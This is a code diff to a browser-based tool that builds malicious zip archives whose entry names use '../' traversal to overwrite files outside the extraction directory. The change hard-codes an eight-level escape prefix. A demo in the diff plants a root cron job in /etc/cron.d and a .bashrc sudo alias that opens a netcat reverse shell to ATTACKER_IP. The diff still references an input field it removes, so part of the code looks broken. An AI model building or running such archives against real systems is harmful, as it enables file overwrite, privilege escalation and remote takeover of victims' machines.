@@ -187,10 +187,7 @@ details p { color: var(--muted); font-size: 0.8rem; margin-top: 6px; }
         <button class="btn secondary" id="clear-entries">Clear</button>
       </div>
     </div>
-    <div class="hint">For each file: enter the <b>file name</b>, its <b>content</b> (text or upload), then the <b>overwrite path</b> — the directory where it should be created or overwrite an existing file, e.g. <span style="font-family:var(--mono)">/home/user/</span>. Leave the path empty to keep the file safely inside the extraction directory. The needed <span style="font-family:var(--mono)">../</span> chain is computed automatically.</div>
-
-    <label>Extraction directory (the ../ chain is calculated against this)</label>
-    <input type="text" id="target-dir" placeholder="/var/www/app/updates" value="/var/www/app/updates" spellcheck="false" />
+    <div class="hint">For each file: enter the <b>file name</b>, its <b>content</b> (text or upload), then the <b>overwrite path</b> — the directory where it should be created or overwrite an existing file, e.g. <span style="font-family:var(--mono)">/home/user/</span>. Leave the path empty to keep the file safely inside the extraction directory. Absolute overwrite paths get a standard <span style="font-family:var(--mono)">../../../../../../../../</span> prefix added automatically.</div>
 
     <div id="entry-form" style="display:none">
       <label>1 · File name (added to the archive)</label>
@@ -497,39 +494,32 @@ $("entry-file").addEventListener("change", async e => {
 
 /* ---------- entries ---------- */
 /* ---------- overwrite path → archive entry name ---------- */
-function buildEntryName(targetDir, fileName, dest) {
-  const base = (targetDir || "/tmp/extract").replace(/\\/g, "/").replace(/^\/+|\/+$/g, "").split("/").filter(Boolean);
+function buildEntryName(fileName, dest) {
   const d = (dest || "").trim().replace(/\\/g, "/").replace(/\/+$/, "");
-  if (!d) return { entry: fileName, destPath: null };
+  if (!d) return { entry: fileName };
   if (d.startsWith("/")) {
-    // absolute destination: compute the exact ../ chain needed from the target dir
-    const segs = d.split("/").filter(Boolean);
-    let common = 0;
-    while (common < base.length && common < segs.length && base[common] === segs[common]) common++;
-    const ups = base.length - common;
-    const rest = segs.slice(common).join("/");
-    return { entry: "../".repeat(ups) + rest + "/" + fileName, destPath: "/" + segs.join("/") };
+    // absolute destination: standard 8-level traversal prefix guarantees escape
+    return { entry: "../".repeat(8) + d.replace(/^\/+/, "") + "/" + fileName };
   }
   // relative destination (may include raw ../) — used as-is
-  return { entry: d + "/" + fileName, destPath: null };
+  return { entry: d + "/" + fileName };
 }
 function updatePreview() {
   const fileName = $("entry-name").value.trim();
-  const dest = $("entry-dest").value;
-  const target = $("target-dir").value.trim() || "/tmp/extract";
+  const dest = $("entry-dest").value.trim();
   if (!fileName) {
     $("preview-entry").textContent = "→ archive entry: (enter a file name)";
     $("preview-lands").textContent = "lands at: …";
     return;
   }
-  const r = buildEntryName(target, fileName, dest);
-  const a = analyzePath(target, r.entry);
+  const r = buildEntryName(fileName, dest);
   $("preview-entry").textContent = "→ archive entry: " + r.entry;
-  $("preview-lands").textContent = a.isAbs
-    ? "replaces " + a.naive + " directly (absolute path)"
-    : (a.escapes ? "overwrites / creates: " + a.naive : "lands at: " + a.naive + " (inside target)");
+  $("preview-lands").textContent = dest.startsWith("/")
+    ? "overwrites / creates: " + dest + (dest.endsWith("/") ? "" : "/") + fileName
+    : (dest ? "lands at: " + dest + "/" + fileName + " (inside extraction dir)"
+            : "lands inside the extraction dir");
 }
-["entry-name", "entry-dest", "target-dir"].forEach(id => $(id).addEventListener("input", updatePreview));
+["entry-name", "entry-dest"].forEach(id => $(id).addEventListener("input", updatePreview));
 
 $("toggle-form").addEventListener("click", () => {
   $("entry-form").style.display = "block";
@@ -551,7 +541,7 @@ $("add-entry").addEventListener("click", () => {
     srcLabel = "file · " + data.length + " B";
   }
   const dest = $("entry-dest").value.trim();
-  const r = buildEntryName($("target-dir").value.trim() || "/tmp/extract", fileName, dest);
+  const r = buildEntryName(fileName, dest);
   entries.push({ fileName, dest, entry: r.entry, data, srcLabel });
   $("entry-name").value = "";
   $("entry-content").value = "";
@@ -574,7 +564,7 @@ function renderEntries() {
   const list = $("entry-list");
   list.innerHTML = "";
   entries.forEach((e, i) => {
-    const a = analyzePath($("target-dir").value, e.entry);
+    const a = analyzePath("/tmp/extract", e.entry);
     const div = document.createElement("div");
     div.className = "entry";
     const escBadge = a.isAbs
@@ -598,14 +588,13 @@ function renderEntries() {
 function escapeHtml(s) {
   return s.replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
 }
-$("target-dir").addEventListener("input", renderEntries);
 
 /* ---------- classic demo ---------- */
 $("load-demo").addEventListener("click", () => {
   entries = [
     { fileName: "update.txt", dest: "", entry: "update.txt", data: enc.encode("legit update file — stays inside the extraction directory\n"), srcLabel: "text · demo" },
-    { fileName: "evil", dest: "/etc/cron.d/", entry: "../../../../etc/cron.d/evil", data: enc.encode("* * * * * root /tmp/pwned\n"), srcLabel: "text · demo" },
-    { fileName: ".bashrc", dest: "/home/user/", entry: "../../../../home/user/.bashrc", data: enc.encode("alias sudo='sudo sh -c \"nc -e /bin/sh ATTACKER_IP 4444\"'\n"), srcLabel: "text · demo" }
+    { fileName: "evil", dest: "/etc/cron.d/", entry: "../../../../../../../../etc/cron.d/evil", data: enc.encode("* * * * * root /tmp/pwned\n"), srcLabel: "text · demo" },
+    { fileName: ".bashrc", dest: "/home/user/", entry: "../../../../../../../../home/user/.bashrc", data: enc.encode("alias sudo='sudo sh -c \"nc -e /bin/sh ATTACKER_IP 4444\"'\n"), srcLabel: "text · demo" }
   ];
   $("target-dir").value = "/var/www/app/updates";
   renderEntries();
@@ -641,7 +630,7 @@ $("upload-zip").addEventListener("change", async e => {
   try {
     const buf = await f.arrayBuffer();
     const found = parseZip(buf);
-    const target = $("target-dir").value.trim() || "/tmp/extract";
+    const target = "/tmp/extract";
     const list = $("analyze-list");
     list.innerHTML = "";
     let danger = 0;
